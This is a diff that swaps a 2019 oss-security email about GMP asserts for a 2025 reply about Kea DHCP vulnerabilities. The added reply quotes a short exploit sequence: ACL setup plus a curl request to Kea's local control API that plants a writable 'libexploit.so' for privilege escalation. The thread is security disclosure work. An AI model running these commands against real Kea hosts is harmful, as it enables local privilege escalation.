@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["827" "Tuesday" "1" "January" "2019" "11:49:02" "-0500" "Jeffrey Walton" "noloader@gmail.com" "<CAH8yC8mDCmQV2SXMT-UQou+y=YzAQQ6HPbKinq1d0ERdCBEO=Q@mail.gmail.com>" "23" "[oss-security] Re: Asserts considered harmful (or GMP spills its sensitive information)" "^Cc:" nil nil "1" "2019010116:49:02" "[oss-security] Re: Asserts considered harmful (or GMP spills its sensitive information)" (number mark "        noloader@gma Jan  1   23/827   " thread-indent "\"[oss-security] Re: Asserts considered harmful (or GMP spills its sensitive information)\"\n") "<CAH8yC8mqdkjQ0pF2QadoMjnZS47SrrZS+H8HMOKv2GqLwcXh0A@mail.gmail.com>" ("<CAH8yC8m90KssanbHt+YmVt7iLOiwWHASDqRYW5TQGeNV2zWXDw@mail.gmail.com>" "<20181231191642.GB7238@zira.vinc17.org>" "<CAH8yC8=-Lt0_p2sTnqhJOWjapJ84LNR=8zJFF5oWs=-4xgxigg@mail.gmail.com>" "<20190101112042.GE7238@zira.vinc17.org>" "<nnwonoob4v.fsf@armitage.lysator.liu.se>" "<86o990wdu4.fsf@shell.gmplib.org>" "<CAH8yC8mqdkjQ0pF2QadoMjnZS47SrrZS+H8HMOKv2GqLwcXh0A@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 9737 invoked by uid 550); 1 Jan 2019 17:02:16 -0000
+Received: (qmail 7812 invoked by uid 550); 30 May 2025 08:12:03 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,71 +6,122 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 28187 invoked from network); 1 Jan 2019 16:49:47 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:references:in-reply-to:reply-to:from:date:message-id
-         :subject:to:cc:content-transfer-encoding;
-        bh=4zWUjcB7z1rhRyVSdbCpXakB8Ez1Nxuvv/7XEd+j7f8=;
-        b=lM0Vs/QKL1b70BtRNDOBo5bzZV94bZ8jnXxX+KSCCQcbBK9qQDJOU0JBqMq/w49N7C
-         iMSObONoBATIP7Q94YIqm96pt/vT+qSEPhQ8ubU62N8HOZljv2mclVLzNAP6bwx0hKP8
-         g3KUQT43z6k265T6JZbS4Za/kWBiVokQOH214KS8KH4pTJQoPFwG93cPXinQcnMzgASD
-         NZRwY61rnUgvnMP5kapb2Vc7aQGbiMo/beCajcI2XAtHgzp7R73K1q+PVXgk/p6yoV09
-         8L8yqlhdRdef1I2tCznPQWmbf3ezqB2QbP0N2oH+nsr5bawQaRx1ZDzYD5CQIQZjYBsj
-         S5ug==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:reply-to
-         :from:date:message-id:subject:to:cc:content-transfer-encoding;
-        bh=4zWUjcB7z1rhRyVSdbCpXakB8Ez1Nxuvv/7XEd+j7f8=;
-        b=i/JwMJNsKeFenkx7isZdZ2Kt5crPRSJ9xz8rL2hMXleIROj2CbGFOj9VOFxaUV9t7o
-         /UpoRC2hWfEGyU6K4FKgwijaosjrryFo+4jP9nWcdN4qNXWaGhKzBgLGPpVJoQKLFC+Q
-         0OM0GOCOVqWIBB5ZUQg+jC4a7auTObgJUmGrkcqYTujNWYCBW6JrpfmCQWh5/WvLRvix
-         xImZSnD6HaIuzgh2r1TcUiqfRjyxEYTq8XbG2DdMxrYhUXhMKSrrUqiISnuwd6qOV9E9
-         YaxQMZ9zqhGPYsodWEeL0qmUFX137j00DIRxltXjJYR7mtR/PKC5LGToL7RD3s5nr0/7
-         Regg==
-X-Gm-Message-State: AJcUukdT8rpgReBEnZMhofLT8jeuMHpK5pjTEgba2k4zkB0bF0LgJ33+
-	3blvydMcU9dsZbh0MWCHHbNmtdozYAom0zeFO3U=
-X-Google-Smtp-Source: ALg8bN5uRGDLhLzG+TQVuu/R/GWzMAGai4rjglpgOSoycvIKVzKAcJmXNGhDUGv36bNTpbd+GfN/sYoNqvENxUCRKBY=
-X-Received: by 2002:a6b:ab85:: with SMTP id u127mr26038909ioe.143.1546361375061;
- Tue, 01 Jan 2019 08:49:35 -0800 (PST)
-MIME-Version: 1.0
-References: <CAH8yC8m90KssanbHt+YmVt7iLOiwWHASDqRYW5TQGeNV2zWXDw@mail.gmail.com>
- <20181231191642.GB7238@zira.vinc17.org> <CAH8yC8=-Lt0_p2sTnqhJOWjapJ84LNR=8zJFF5oWs=-4xgxigg@mail.gmail.com>
- <20190101112042.GE7238@zira.vinc17.org> <nnwonoob4v.fsf@armitage.lysator.liu.se>
- <86o990wdu4.fsf@shell.gmplib.org> <CAH8yC8mqdkjQ0pF2QadoMjnZS47SrrZS+H8HMOKv2GqLwcXh0A@mail.gmail.com>
-In-Reply-To: <CAH8yC8mqdkjQ0pF2QadoMjnZS47SrrZS+H8HMOKv2GqLwcXh0A@mail.gmail.com>
-Message-ID: <CAH8yC8mDCmQV2SXMT-UQou+y=YzAQQ6HPbKinq1d0ERdCBEO=Q@mail.gmail.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-Cc: =?UTF-8?Q?Niels_M=C3=B6ller?= <nisse@lysator.liu.se>, 
-	oss-security@lists.openwall.com, gmp-bugs@gmplib.org
-Date: Tue, 1 Jan 2019 11:49:02 -0500
-From: Jeffrey Walton <noloader@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Asserts considered harmful (or GMP spills its sensitive information)
-To: =?UTF-8?Q?Torbj=C3=B6rn_Granlund?= <tg@gmplib.org>
+x-ms-reactions: disallow
+Received: (qmail 7794 invoked from network); 30 May 2025 08:12:03 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+	t=1748592712; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
+	b=pVULYuYolz/i+kPFbb4O6Zoku/vzNIAejMXvFEbDpfAnNG9YwOJ5MkEBfuciRD5+4Ur5sF
+	FZSOSPdfKlm+IRQqwXvuVdjTADjN+FQ350CzKJTXwRJnDW3DmWuqbvoN6deM9JswMyX96a
+	cainBkmr8P2pzxO30YEZJUoqUxyrs60=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+	s=susede2_ed25519; t=1748592712;
+	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
+	b=JmTvwlQnAjmvRNMxCUtHcWwKVQO8QmI5+N8n3sqI/kIoLbZog4TJuo7WP2U+Rs1MeVEdmd
+	PFBlrTayo3BNYSCw==
+Authentication-Results: smtp-out2.suse.de;
+	none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+	t=1748592712; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
+	b=pVULYuYolz/i+kPFbb4O6Zoku/vzNIAejMXvFEbDpfAnNG9YwOJ5MkEBfuciRD5+4Ur5sF
+	FZSOSPdfKlm+IRQqwXvuVdjTADjN+FQ350CzKJTXwRJnDW3DmWuqbvoN6deM9JswMyX96a
+	cainBkmr8P2pzxO30YEZJUoqUxyrs60=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+	s=susede2_ed25519; t=1748592712;
+	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
+	b=JmTvwlQnAjmvRNMxCUtHcWwKVQO8QmI5+N8n3sqI/kIoLbZog4TJuo7WP2U+Rs1MeVEdmd
+	PFBlrTayo3BNYSCw==
+Date: Fri, 30 May 2025 10:11:51 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
+To: oss-security@lists.openwall.com
+Message-ID: <aDloR_R9LjYpBB28@kasco.suse.de>
+References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
+ <aDdGEfMxLaRJzSK9@kasco.suse.de>
+ <20250528182325.yuupynsufybqvea3@jwilk.net>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="kWcRLGka4QwYZNRp"
+Content-Disposition: inline
+In-Reply-To: <20250528182325.yuupynsufybqvea3@jwilk.net>
+Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
+ (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)
 
-On Tue, Jan 1, 2019 at 11:45 AM Jeffrey Walton <noloader@gmail.com> wrote:
->
-> On Tue, Jan 1, 2019 at 11:19 AM Torbj=C3=B6rn Granlund <tg@gmplib.org> wr=
-ote:
-> >
-> >   The assert that Jeffrey has hit is in sec_powm.c,
-> >
-> >     ASSERT_ALWAYS (enb >=3D windowsize);
-> >
-> >   As far as I can see, "enb" is the input argument to the win_size func=
-tion,
-> >   and "windowsize" is the return value. I'm waiting for more informatio=
-n,
-> >   since it works fine in my build. Possible explanations I see are
-> >
-> > A reasonable assumption is that this user has modified the sources to
-> > cause this bug.  The motive would be to support his auxesis about how
-> > insecure GMP is.
->
-> My bad, I did not mean to imply this was a problem with GMP only. GMP
-> has a lot of company, like GnuPG and OpenSSL.
+--kWcRLGka4QwYZNRp
+Content-Type: text/plain; protected-headers=v1; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+Date: Fri, 30 May 2025 10:11:51 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
+To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
+ (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)
 
-    s/OpenSSL/libsodium/
+Hi,
+
+On Wed, May 28, 2025 at 08:23:25PM +0200, Jakub Wilk wrote:
+> * Matthias Gerstner <mgerstner@suse.de>, 2025-05-28 19:21:
+> >By leveraging issue 3.2), the Kea services can be instructed to create=20
+> >`_kea` owned files in the attacker's `$HOME/.Private`. The content of=20
+> >the created files is not fully attacker controlled, however, so it will=
+=20
+> >not be possible to craft a valid ELF object for loading via `dlopen()`=20
+> >this way. By placing a setgid-directory in `$HOME/.Private/evil-dir`,=20
+> >any files created in this directory will even have the group-ownership=20
+> >of the attacker. The file mode will be 0644, however,
+>=20
+> Default ACLs to the rescue!
+>=20
+> $ chmod a+x ~
+> $ mkdir -m 777 ~/.Private
+> $ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
+> $ curl -s -H "Content-Type: application/json" -d '{ "command": "config-wr=
+ite", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' lo=
+calhost:8000 > /dev/null
+> $ echo pwned > ~/.Private/libexploit.so
+> $ ls -l ~/.Private/libexploit.so
+> -rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.so
+> $ cat ~/.Private/libexploit.so
+> pwned
+
+very nice addition! We already felt like there was little left to
+succeed in the attack, but didn't think of ACLs.
+
+We will make an update to our blog post to reflect this.
+
+Cheers
+
+Matthias
+
+--kWcRLGka4QwYZNRp
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmg5aEcACgkQFMQFyXGS
+NVMJ4Q/6A2SCjmKOoCVBPUC6Fik7JagfbsOp7WZKXnR1VX727YeqsVigSVm6vH0A
+VpqH36ar9Yw6q3sLymxkHNn+A/X/UMGMnA5025JnpoaIqU1r/jwz4BltYywBo0Th
+qitNIEioRh97d3hXqR2LXm+5ZOzMk+AqINtUQXDcxpzLHOmCP5SdWBeS9kivoRn6
+hWaoNanI1SAoEAud5/8Lhk98WKRr0i22XeUVFDiWV0VU31s59uvqeRycyp0pqE8h
+S3lizQuN4rfSx3rR3YMWx4V0NxGqYZX5e7MQga3Q62qEUdpo1JlOsv0frM2vEcDH
+oK+4ObKEjIX/O97vJPY/TE8kcKb1NFwTGfSc7OPM5nAdUH9hZKEeprX4tubtBSva
+WcaiMqDdpJcYrJTBMWxy27++PN7NuBXROqrco87+rssJ9bCem+fF8vJ0P6riJhwN
+X2ZvbTAC45JZ5kztiFl7VU3shI0E/I2U3oSnpUmKpP5vJHSrproDkbczJg2+zWOP
+T9GBqCiSOoLbAxz1M5H5euYs5Ezk+RrbbO3CCWuKXpXm6U9S24ZD/ZCnkEvZti5C
+EXObZq1XHk8ckMubofr0hWvJCw8wAZxOs4dnrtQsBnwYPpjZD/af80ZuB3KtBZQY
+GbjXyXaIDfglvsda27HhppbJOOxAFigaRL5GmNNBz2S8sDMfJ+A=
+=B799
+-----END PGP SIGNATURE-----
+
+--kWcRLGka4QwYZNRp--
